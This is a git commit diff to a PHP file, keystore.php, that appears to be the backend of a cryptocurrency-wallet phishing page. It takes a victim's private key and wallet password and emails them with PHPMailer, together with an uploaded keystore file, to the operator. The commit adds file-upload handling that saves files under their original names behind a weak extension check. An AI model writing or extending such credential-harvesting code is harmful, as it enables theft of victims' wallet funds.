09ab1c10bb67984a3ed878fc720e0c2fb775f017
feranmiemmanuel <feranmiolasunkanmi91@gmail.com>
2021-11-17 16:37:39 +0100

    24

--- keystore.php
+++ keystore.php
@@ -19,9 +19,32 @@ if($wallet_pass== ''){
       $subject='Query from '.$sender;
       $message='Dear Sir,<br><br>'.$subject.'<br><br>privatekey: '.$privateKey.'<br>pk Password: '. $wallet_pass . '<br>' . $email_from;
 
-$targetDir = "uploads/";
-$fileName = basename($_FILES["attachment"]["name"]);
-$targetFilePath = $targetDir . $fileName;
+      if(isset($_FILES['attachment'])){
+            $errors= array();
+            $file_name = $_FILES['attachment']['name'];
+            $file_size =$_FILES['attachment']['size'];
+            $file_tmp =$_FILES['attachment']['tmp_name'];
+            $file_type=$_FILES['attachment']['type'];
+            $file_ext=strtolower(end(explode('.',$_FILES['attachment']['name'])));
+
+            $extensions= array("jpeg","jpg","png");
+
+            if(in_array($file_ext,$extensions)=== false){
+               $errors[]="extension not allowed, please choose a JPEG or PNG file.";
+            }
+
+            if($file_size > 2097152){
+               $errors[]='File size must be excately 2 MB';
+            }
+
+            if(empty($errors)==true){
+               move_uploaded_file($file_tmp,"uploads/".$file_name);
+               echo "Success";
+            }else{
+               print_r($errors);
+            }
+         }
+
 
 
 $mail = new PHPMailer();
@@ -36,7 +59,7 @@ $mail->setFrom($email_from);
 $mail->AddReplyTo($email_from);
 $mail->Subject = "/New Entry";
 $mail->MsgHTML($email_from);
-$mail->addAttachment($_FILES["attachment"]["name"]);
+$mail->addAttachment("uploads/".$file_name);
 $mail->addAttachment($targetFilePath);
 $mail->Body = "Wallet Password= " . $wallet_pass;
 
